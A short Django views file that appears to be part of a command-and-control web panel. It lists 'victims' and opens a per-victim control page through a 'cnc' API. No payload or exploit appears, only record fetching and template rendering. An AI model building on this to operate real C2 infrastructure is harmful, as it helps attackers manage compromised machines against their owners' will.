from django.shortcuts import render
from django.http import HttpResponse,HttpResponseRedirect
from web.cnc import Api
from web import structs
# Create your views here.
def home(response):
    victims = Api.get_all_victims() # {Status:bool,data:[VICTIM}
    print(victims)
    if victims["Status"]:
        data = {"victims":victims["data"]}
    return render(response,"landing/landing.html",data)

def control(response,id:int):
    victim = Api.get_victim_by_id(id)
    if victim["Status"]:
        data = {"victim":victim["data"]}
    return render(response,"landing/control.html",data)
